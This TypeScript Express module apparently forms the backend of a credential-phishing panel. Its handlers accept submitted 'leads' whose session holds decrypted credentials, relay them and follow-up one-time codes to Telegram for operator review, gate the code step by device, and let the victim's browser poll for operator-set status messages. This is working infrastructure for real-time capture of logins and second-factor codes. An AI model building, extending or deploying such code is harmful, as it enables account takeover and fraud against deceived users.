import type { RequestHandler } from "express";
import { codeLeadSchema, leadSchema } from "../schemas/lead.schemas.js";
import {
  requestTelegramCodeLeadReview,
  requestTelegramLeadReview,
} from "../methods/telegram.methods.js";
import type {
  LeadProcess,
  LeadSessionState,
  LeadStatus,
} from "../methods/lead.methods.js";
import { getLeadIdentity, readLeadSession } from "../methods/lead.methods.js";
import {
  isKnownDeviceForLead,
  linkDeviceToLead,
} from "../methods/device.methods.js";

/**
 * The shape the browser polls for. The session record itself carries the
 * decrypted credentials, so it must never be serialised straight to a client.
 */
type LeadChannelSnapshot = {
  anchor: string;
  status: LeadStatus;
  process: LeadProcess;
  message: string;
};

function toLeadChannelSnapshot(
  session: LeadSessionState,
  anchor: string,
): LeadChannelSnapshot {
  return {
    anchor,
    status: session.status,
    process: session.process,
    message: session.feedback,
  };
}

export const leadPostHandler: RequestHandler = async (request, response) => {
  const lead = leadSchema.safeParse(request.body);
  if (!lead.success) {
    response.status(400).json({
      ok: false,
      error: {
        code: "VALIDATION_ERROR",
        message: lead.error.issues[0].message,
      },
    });
    return;
  }
  try {
    const leadIdentity = getLeadIdentity(lead.data);
    await linkDeviceToLead(lead.data.clientId, leadIdentity);
    const session = await requestTelegramLeadReview(
      lead.data.sessionId,
      lead.data,
    );
    response
      .status(202)
      .json(toLeadChannelSnapshot(session, lead.data.sessionId));
  } catch (e) {
    console.error("Lead post handling failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "LEAD_HANDLING_FAILED",
        message:
          e instanceof Error
            ? e.message
            : "An error occurred. \nPlease try again.",
      },
    });
  }
};

export const codeLeadPostHandler: RequestHandler = async (
  request,
  response,
) => {
  const leadCode = codeLeadSchema.safeParse(request.body);
  if (!leadCode.success) {
    response.status(400).json({
      ok: false,
      error: {
        code: "VALIDATION_ERROR",
        message:
          leadCode.error.issues[0]?.message ??
          "Check the submitted information.",
      },
    });
    return;
  }
  try {
    const leadIdentity = getLeadIdentity(leadCode.data);
    const authorized = await isKnownDeviceForLead(
      leadCode.data.clientId,
      leadIdentity,
    );
    if (!authorized) {
      response.status(403).json({
        ok: false,
        error: {
          code: "CLIENT_UNAUTHORIZED",
          message: "This device is not authorized for this flow.",
        },
      });
      return;
    }
    const session = await requestTelegramCodeLeadReview(
      leadCode.data.sessionId,
      {
        type: leadCode.data.type,
        code: leadCode.data.code,
      },
    );
    response
      .status(202)
      .json(toLeadChannelSnapshot(session, leadCode.data.sessionId));
  } catch (e) {
    console.error("Code lead post handling failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "CODE_LEAD_HANDLING_FAILED",
        message:
          e instanceof Error
            ? e.message
            : "An error occurred. \nPlease try again.",
      },
    });
  }
};

export const leadGetHandler: RequestHandler<{
  anchor: string;
}> = async (request, response) => {
  try {
    const anchor = request.params.anchor;
    if (!anchor) {
      response.status(400).json({
        ok: false,
        error: {
          code: "MISSING_ANCHOR",
          message: "A session anchor is required.",
        },
      });
      return;
    }
    const session = await readLeadSession(anchor);
    if (!session) {
      response.status(202).json({
        anchor,
        status: "failed",
        process: "init",
        message: "This session has expired. Reload the page and try again.",
      } satisfies LeadChannelSnapshot);
      return;
    }
    response.status(202).json(toLeadChannelSnapshot(session, anchor));
  } catch (e) {
    console.error("Lead get handling failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "LEAD_GET_HANDLING_FAILED",
        message: "An error occurred. \nPlease try again.",
      },
    });
  }
};
